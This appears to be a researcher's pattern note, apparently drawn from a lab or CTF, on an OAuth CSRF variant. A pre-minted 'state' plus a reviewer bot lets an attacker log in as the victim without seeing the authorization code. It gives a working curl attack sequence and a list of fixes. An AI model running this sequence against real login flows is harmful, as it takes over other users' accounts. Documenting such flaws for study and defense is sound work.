# OAuth tk/state CSRF with Server-Staged Code Exchange

## Date

2026-07-11

## Target Type

OAuth login flows with pre-minted `state`, HttpOnly session cookies separate from OAuth callback, reviewer/admin bots, and `POST /report` URL submission

## Bug Class

OAuth CSRF, session fixation, cross-user authorization code acceptance, missing callback-session binding

## Initial Signal

- App sets a cookie on `GET /` (e.g. `tk`) before OAuth starts
- `GET /init` mints long server-side `state` bound to that cookie
- Attacker can embed `state` in a **Google OAuth URL** and deliver it to a victim
- Victim completes IdP login (`prompt=none` if bot/reviewer has session)
- Victim lands on `/callback?code=...&state=...` but attacker never sees the code
- Attacker still completes login with `GET /auth` using pre-seeded cookie
- No `/logger`, postMessage, or hash exfil needed — code is staged server-side

## Pattern

### Flow

```text
Attacker                          Server                         Victim (reviewer bot)
   |                                 |                                    |
   | GET /  -> tk cookie             |                                    |
   | GET /init -> state S            | stores bind(tk, S)                 |
   | craft OAuth URL with state S    |                                    |
   | POST /report(oauth_url)         |                                    |
   |                                 |     victim visits OAuth URL        |
   |                                 |     <- callback?code=C&state=S ----|
   |                                 | stages code C for state S          |
   | GET /auth (cookie tk)           |                                    |
   | <- session for victim identity -|                                    |
```

### Trust boundary failure

OAuth `state` is meant to bind the IdP response to the **same browser** that started the flow. Here:

- Attacker initiates flow (`tk` + `state`)
- Victim supplies IdP identity (Google authorization `code`)
- Server accepts victim's code for attacker's pending `state` when attacker calls `/auth`

Attacker never needs the `code` in their browser.

## Common mistake

Chasing sl3-style exfil (`/logger`, hybrid fragment, DOMPurify, postMessage) when the backend already associates the victim's callback with attacker's pre-minted `state`.

**Test early:** after victim hits `/callback`, does attacker `GET /auth` alone succeed?

## Minimal test

```bash
# Attacker preshot
curl -sS -c att.txt 'https://[app]/' -o /dev/null
STATE=$(curl -sS -b att.txt 'https://[app]/init' -D - -o /dev/null | grep -i '^location:' | sed 's/.*state=//' | cut -d'&' -f1)

# Victim completes OAuth (bot, second browser, or report)
OAUTH='https://[idp]/o/oauth2/v2/auth?client_id=[client]&redirect_uri=[callback]&response_type=code&scope=openid+email+profile&prompt=none&state='"$STATE"
curl -sS -X POST 'https://[app]/report' --data-urlencode "url=$OAUTH"

# Attacker completes without ever holding code
curl -sS -b att.txt 'https://[app]/auth' -L
curl -sS -b att.txt 'https://[app]/profile'
```

Expected: victim identity on attacker's session (privileged reviewer profile in lab).

## Fix

- Bind `state` to the initiating browser session; reject code exchange unless callback request carries same session that created `state`
- One-time `state` + PKCE for public clients
- Do not stage authorization codes for cross-browser retrieval via attacker session alone
- Log and alert on `state` completion from a different IP/User-Agent than `/init`

## Related

- `writeups/solo-leveling-state-gate-oauth-csrf.md`
- `payloads/oauth/crafted-oauth-link-csrf-review-bot.md`
- `notes/oauth-hybrid-response-fragment-logger-exfil.md` (sl3 — exfil required; different variant)
- `labs/2026-07-11-solo-leveling-state-gate-oauth-csrf.md`
